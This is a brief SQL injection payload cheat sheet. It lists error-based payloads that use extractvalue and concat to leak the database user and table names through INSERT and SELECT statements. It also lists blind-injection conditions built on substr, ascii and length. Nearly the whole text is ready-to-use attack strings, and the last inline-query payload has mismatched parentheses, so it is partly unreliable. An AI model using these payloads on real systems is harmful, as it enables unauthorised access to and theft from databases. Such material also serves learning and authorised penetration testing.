PAYLOAD
====

<H3>Errror base payload:</h3>
  
     
  If data is passsing INSERT querry and error is triggering

    ' or extractvalue(1,concat(0x7e,user())) or ' to find user()
  
    ' or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) or ' to find table name

If data is passing in select querry

    and extractvalue(1,concat(0x7e,user())) to find user()

    and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) to find table name

<h3>Blind SQL Injection</h3>
  
  Substring() To find the user() name
  
       substr(user(),1,1)>'a'   position* character*
  
  Ascii() To find the character from the value
  
       ascii(substr(user(),1,1))>10

Length() To find the length of the string
  
  length(database())>10
  
  Inserting Inline querry
  
       ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1,1)>100 to find table name
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
